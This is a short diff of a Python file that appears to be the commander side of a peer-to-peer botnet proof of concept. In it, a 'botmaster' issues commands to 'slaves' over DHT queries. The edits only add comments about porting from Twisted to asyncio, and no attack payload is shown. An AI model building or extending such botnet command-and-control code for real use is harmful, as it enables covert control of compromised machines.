@@ -15,7 +15,7 @@ import asyncio
 # All communication between commanders and bots occurs through DHT queries, they never communicate directly.
 
 
-class SlaveDriver(basic.LineReceiver):
+class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
     from os import linesep as delimiter
     import hashlib
 
@@ -25,7 +25,7 @@ class SlaveDriver(basic.LineReceiver):
         self.key = key
         self.slaves = {}
         self.count = 0
-        self.slaveloop = task.LoopingCall(self.checknewslave)
+        self.slaveloop = task.LoopingCall(self.checknewslave) #Replace with Asyncio version
         self.slaveloop.start(5)
 
     # check DHT for new nodes
@@ -122,7 +122,7 @@ boot_ip = str(sys.argv[1])
 boot_port = int(sys.argv[2])
 myport = int(sys.argv[3])
 # Logging is useful for debugging but it interferes with our command interface
-# log.startLogging(sys.stdout)
+# log.startLogging(sys.stdout) #Replace with regular python loggin. 
 
 kserver = Server()
 await kserver.listen(myport)
@@ -140,5 +140,7 @@ keyhash = key.hexdigest()
 # This could easily be changed from std input to remote input
 # we used stdin for proof of concept but the remote input would allow
 # the botmaster to spin up a commander from any location at any time.
-stdio.StandardIO(SlaveDriver(kserver, keyhash))
-reactor.run()
+stdio.StandardIO(SlaveDriver(kserver, keyhash)) #Replace with asyncio version
+
+reactor.run() #Change to AsyncIO loop
+
